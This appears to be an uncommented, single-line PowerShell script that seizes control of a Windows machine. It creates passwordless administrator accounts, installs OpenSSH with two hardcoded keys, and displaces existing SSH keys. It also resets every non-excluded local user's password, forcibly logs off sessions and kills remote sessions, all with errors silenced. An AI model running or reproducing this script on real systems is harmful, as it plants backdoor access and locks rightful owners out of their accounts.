param([Parameter(Mandatory)][string]$ss,[string]$ExUs);$ErrorActionPreference='SilentlyContinue';$ExUs=if($ExUs){[System.Net.WebUtility]::UrlDecode($ExUs)-split ","}else{@()};$ExUs=@($ExUs)+@('gt','gtmon');Get-NetAdapter -Physical|Disable-NetAdapter -Confirm: $false;$sha=[System.Security.Cryptography.SHA256]::Create();$ausers=@("alice","bob");foreach($au in $ausers){if(-not(Get-LocalUser -Name $au)){New-LocalUser -Name $au -NoPassword|Out-Null};Add-LocalGroupMember -Group "Administrators" -Member $au|Out-Null};$osit='OpenSSH-Server-In-TCP';$sshCap=Get-WindowsCapability -Online -Name 'OpenSSH.Server*';if($sshCap -and $sshCap.State -ne 'Installed'){Add-WindowsCapability -Online -Name $sshCap.Name};Set-Service -Name sshd -StartupType Automatic;Start-Service -Name sshd;if(-not(Get-NetFirewallRule -Name $osit)){New-NetFirewallRule -Name $osit -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22|Out-Null};$adm1='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI';$adminKeys=[ordered]@{alice=$adm1 +'FvURMi8q6qjLkYjbSDXAujI5PGvzfNeTa+C182Dag2M alice';bob=$adm1 +'PLW83zN4tvR7wacxo9fSs7BdayLGUjw+rD/fF75ACIK bob'};$akf=Join-Path $env:ProgramData 'ssh\administrators_authorized_keys';$adkd=Split-Path -Parent $akf;New-Item -ItemType Directory -Path $adkd -Force|Out-Null;$adminKeys.Values|Set-Content -Path $akf -Encoding ascii -Force;icacls $akf /inheritance:r *>$null;icacls $akf /grant 'SYSTEM:F' 'BUILTIN\Administrators:F' *>$null;icacls $akf /remove 'NT AUTHORITY\Authenticated Users' 'BUILTIN\Users' *>$null;$bkts=Get-Date -Format 'yyyyMMddHHmmss';$profileRoot=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList' -ErrorAction SilentlyContinue).ProfilesDirectory;if(-not $profileRoot){$profileRoot=Join-Path $env:SystemDrive 'Users'};if(Test-Path $profileRoot){Get-ChildItem -Path $profileRoot -Directory -Force|ForEach-Object{$p=Join-Path $_.FullName '.ssh\authorized_keys';if(Test-Path -LiteralPath $p -PathType Leaf){Move-Item -LiteralPath $p -Destination "$p.backup($bkts)" -Force}}};$localUsers=Get-LocalUser|Where-Object{$_.Name -notin $ExUs};foreach($user in $localUsers){$h=-join($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes("$($user.Name.ToUpper())$ss"))|ForEach-Object{$_.ToString("x2")});$p=$h.Substring(0,16);$secure=ConvertTo-SecureString $p -AsPlainText -Force;Set-LocalUser -Name $user.Name -Password $secure;Write-Host "$($user.Name)"};Get-CimInstance Win32_Process -Filter "Name='explorer.exe'"|Select-Object -ExpandProperty SessionId -Unique|Where-Object{$_ -gt 0}|ForEach-Object{$sid=$_;$out=&"$env:SystemRoot\System32\logoff.exe" $sid /v 2>&1|Out-String;Write-Host "logoff $sid exit=$LASTEXITCODE $($out.Trim())"};Get-Process -Name sshd,wsmprovhost|Where-Object{$_.SessionId -ne 0}|ForEach-Object{Stop-Process -Id $_.Id -Force};Restart-Service -Name WinRM -Force;Get-NetAdapter -Physical|Enable-NetAdapter -Confirm: $false;